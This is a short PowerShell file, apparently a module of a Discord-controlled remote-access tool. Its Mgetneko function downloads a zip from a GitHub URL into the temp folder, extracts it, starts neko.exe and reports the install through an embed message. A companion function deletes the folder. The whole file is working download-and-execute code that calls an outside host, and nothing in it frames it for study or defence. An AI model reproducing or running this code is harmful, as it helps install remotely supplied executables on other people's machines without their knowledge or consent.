function Mgetneko {
    $tempfolder  = "$env:temp\neko"
    $nekodownload = "https://github.com/JoshuaBrien/Compilation-of-stuff-i-done/raw/refs/heads/main/Coral_network_discordONLY/assets/neko.zip"
    $nekozip = "$tempfolder\neko.zip"
    if (!(Test-Path -Path $tempfolder)) {
        New-Item -ItemType Directory -Path $tempfolder | Out-Null
    }
    if (!(Test-Path -Path $nekozip)) {
        Iwr -Uri $nekodownload -OutFile $nekozip
    }
    Start-Sleep 1
    Expand-Archive -Path $nekozip -DestinationPath $tempfolder -Force
    Start-Sleep 1
    rm -Path $nekozip -Force
    $proc = "$tempfolder\neko.exe"
    sendEmbedWithImage -Title "Neko Client Downloaded" -Description "Neko client downloaded"
    Start-Process $proc -ArgumentList (".\neko.exe")

}

function Mremoveneko {
    $tempfolder = "$env:temp\neko"
    if (Test-Path -Path $tempfolder) {
        rm -Path $tempfolder -Force
    }
}


